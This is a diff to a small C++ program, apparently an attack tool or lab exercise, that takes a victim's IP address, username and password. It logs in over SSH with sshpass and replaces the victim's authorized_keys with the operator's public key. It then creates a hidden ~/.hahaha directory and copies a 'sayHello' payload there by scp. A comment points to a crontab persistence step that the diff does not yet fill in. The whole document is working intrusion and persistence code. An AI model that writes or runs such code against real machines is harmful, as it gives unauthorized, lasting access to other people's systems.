@@ -8,6 +8,9 @@ void cmd(string s) {
         cout << "\x1b[32mAccept\x1b[0m: ";
     cout << s << '\n';
 }
+void cmd_on_victim(string ssh_prefix, string s) {
+    cmd(ssh_prefix + " \'" + s + "\'");
+}
 int main(int argc, char **argv) {
     if (argc < 4) {
         cout << "Usage: " << argv[0] << " <victim IP address> <username> <password>\n";
@@ -29,5 +32,11 @@ int main(int argc, char **argv) {
 
     // login with password and set public key in victim
     cmd("cat ~/.ssh/id_rsa.pub | sshpass -p \'" + password + "\' " + ssh_prefix + " \'cat > ~/.ssh/authorized_keys\'");
-    cmd(ssh_prefix + " \'chmod 600 ~/.ssh/authorized_keys\'");
+    cmd_on_victim(ssh_prefix, "chmod 600 ~/.ssh/authorized_keys");
+
+    // scp payload to /home/<username>/.hahaha
+    cmd_on_victim(ssh_prefix, "mkdir ~/.hahaha");
+    cmd("scp sayHello " + username + "@" + ip_addr + ":~/.hahaha/sayHello");
+    
+    // set crontab
 }
